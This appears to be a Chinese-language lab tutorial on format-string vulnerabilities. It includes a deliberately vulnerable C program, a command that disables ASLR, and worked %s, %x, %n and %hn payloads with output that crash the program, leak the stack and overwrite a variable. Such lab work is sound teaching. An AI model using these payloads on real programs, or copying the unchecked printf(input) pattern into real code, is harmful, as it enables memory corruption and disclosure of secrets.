# 
#### 如何使用可变参数
printf可以接受任意数目的参数，首先通过自定义的函数理解以下可变参数   
```
#include <stdio.h>
#include <stdarg.h>

int myprint(int Narg, ... )
{
    int i;
    va_list ap;

    va_start(ap, Narg);
    for (i=0; i<Narg; i++)
    {
        printf("%d ", va_arg(ap, int));
        printf("%f\n", va_arg(ap, double));
    }
    va_end(ap);
}

int main()
{
    myprint(1, 2, 3.5);
    myprint(2, 2, 3.5, 3, 4.5);
    return 1;
}
```
va_list 是在 C 语言中引入解决变参问题的一组宏  
a)  首先在函数中定义一个具有va_list型的变量，这个变量是指向参数的指针。  
b)  然后用va_start宏初始化变量刚定义的va_list变量，使其指向第一个可变参数的地址(也就是通过myprint的第一个参数来计算va_list的起始位置)。  
c)  va_arg返回下一个可变参数的位置，va_arg的第二个参数是你要返回的参数的类型  
d)  最后使用va_end宏结束可变参数的获取。  


**而pirntf是通过格式规定符(也就是%的个数)来决定可变参数的数量(va_arg调用次数)**


#### 漏洞程序/实验

**为了简化实验。关闭空间地址随机化**
```
sudo sysctl -w kernel.randomize_va_space=0
```

```
// vul.c
#include <stdio.h>

void fmtstr()
{
    char input[100];
    int var = 0x11223344;

    printf("Target address: %x\n", (unsigned) &var);
    printf("Data at target address: 0x%x\n", var);

    printf("Please enter a string: ");
    fgets(input, sizeof(input)-1, stdin);
    printf(input);
    printf("Data at target address: 0x%x\n", var);
}

void main()
{
    fmtstr();
}
```


#### 攻击一：使程序崩溃
```
ubuntu@VM-0-17-ubuntu:~$ ./vul 
Target address: bffff5d4
Data at target address: 0x11223344
Please enter a string: %s%s%s%s%s%s%s%s%s%s
Segmentation fault (core dumped)
```

![](/software-security/img/format1.png)

每当遇到一个%s,便从va_list指向的位置获取一个值，但是由于其实没有可变参数，va_list现在指向了fprint之外的帧栈,可能指向了fmtstr的帧栈。他们可能都不是合法地址，当一个程序从一个非法地址获取数据就会导致程序崩溃。%s格式规定符是把printf取得的值视为一个地址，并打印出该地址处的字符串。



#### 攻击二：输出栈中的数据
假设漏洞程序中的var是一个秘密值。
```
ubuntu@VM-0-17-ubuntu:~$ ./vul
Target address: bffff5d4
Data at target address: 0x11223344
Please enter a string: %x.%x.%x.%x.%x.%x.%x.%x.
63.b7fcd5a0.bffff60f.bffff60e.11223344.252e7825.78252e78.2e78252e.
Data at target address: 0x11223344
```
%x格式规定符可以以16进制打印出va_list指向的数，为了计算秘密值到va_list的初始位置的距离可以使用试错法，首先尝试8个%x，可以看到var的值在第5个%x输出


#### 攻击三：修改内存中的程序数据
所有的格式规定符都是输出数据的，唯一有一个例外，就是%n，它会把目前已打印的字符串的个数写入内存。  
比如： printf("hello%n", &i)
```
int main()
{
    int i;
    printf("hello%n\n", &i);
    printf("%d\n", i);

}
```
```
shan@shan-GV62-8RC:~/s$ gcc -o test test.c
shan@shan-GV62-8RC:~/s$ ./test
hello
5
```


下面尝试修改内存中的程序数据  
```
ubuntu@VM-0-17-ubuntu:~$ ./vul 
Target address: bffff5d4
Data at target address: 0x11223344
Please enter a string: aaa
aaa
Data at target address: 0x11223344
```
通过正常执行  看到希望修改的地址是bffff5d4  
可以通过`bffff5d4.%x.%x.%x.%x.%x.%x.%x.%x.%x`的方式把地址放入栈中

首先还是通过试错的方式查看bffff5d4在栈中的位置  
注意： 需要用到linux自带的printf命令将shellcode编码才能写入地址，由于命令行输入的shellcode编码不能直接被转义，所以可以先把输入保存在文件中。 因为小端序的缘故放入内存的顺序是d4->f5->ff->bf，\x的作用是把D和4当作是一个数字   
```
ubuntu@VM-0-17-ubuntu:~$ echo $(printf "\xD4\xF5\xFF\xBF").%x.%x.%x.%x.%x.%x.%x.%x.%x > input
ubuntu@VM-0-17-ubuntu:~$ ./vul < input 
Target address: bffff5d4
Data at target address: 0x11223344
Please enter a string: ����.63.b7fcd5a0.bffff60f.bffff60e.11223344.bffff5d4.2e78252e.252e7825.78252e78
Data at target address: 0x11223344
```
可以发现地址在第6个格式化符的位置  
把第6个%换成%n  
```
ubuntu@VM-0-17-ubuntu:~$ echo $(printf "\xD4\xF5\xFF\xBF").%x.%x.%x.%x.%x.%n > input
ubuntu@VM-0-17-ubuntu:~$ ./vul < input 
Target address: bffff5d4
Data at target address: 0x11223344
Please enter a string: ����.63.b7fcd5a0.bffff60f.bffff60e.11223344.
Data at target address: 0x2c
```
成功把var的值修改为0x2c，0x2c即十进制44，说明在遇到%n前输出了44个字符。

!!! shell一句话判断大小端序
    echo -n I | od -o | head -n1 | cut -f2 -d" " | cut -c6
    1为小端模式，0为大端模式



#### 攻击四：修改数据为指定值 
例如把var的值修改为0x9896a4 转成10进制就是10000036  
可以通过修改格式符的进度来控制字符数  
10000000 + 4 * 8 = 10000036
```
ubuntu@VM-0-17-ubuntu:~$ echo $(printf "\xD4\xF5\xFF\xBF").%8x.%8x.%8x.%8x.%10000000x.%n > input
...
Data at target address: 0x9896aa
```
可以看到成功把值改为0x9896aa。整个过程大约耗时十几秒.  
如果把值改成0x66887799,换成10进制就是17亿多。这个过程估计需要几个小时，有时间的朋友可以尝试以下。

!!! note
    注意地址\xD4\xF5\xFF\xBF 中的英文字符需要大写


#### 攻击五：更快的方法
%n视为4个字节 %hn视为2个字节 %hhn视为1个字节   
因此可以尝试用%hn把var的值修改为0x66887799  
现在把地址bffff5d4按两个字节来分就是 0xbffff5d4和0xbffff5d6。因为是小端序，需要把0x7799放在地址0xbffff5d4上，0x6688放在地址0xbffff5d6上。
```
ubuntu@VM-0-17-ubuntu:~$ echo $(printf "\xD6\xF5\xFF\xBF@@@@\xD4\xF5\xFF\xBF")%.8x%.8x%.8x%.8x%.26204x%hn%.4369x%hn > input
ubuntu@VM-0-17-ubuntu:~$ ./vul < input
...
Data at target address: 0x66887799
```
`\xD4\xF5\xFF\xBF@@@@\xD6\xF5\xFF\xBF`是12个字符  
12 + 8*4 + 26204 = 26248  十六进制是 6688  
26248 + 4369 = 30617  十六进制是 7799  
在两个地址之间插入四个字节的@@@@是为了在两个%hn之间在插入一个%x，这样第二个%hn的时候才到累加到30617完成目标  

这个过程几乎是一瞬间的事情，可以看到通过字节拆分后赋值效率很高  





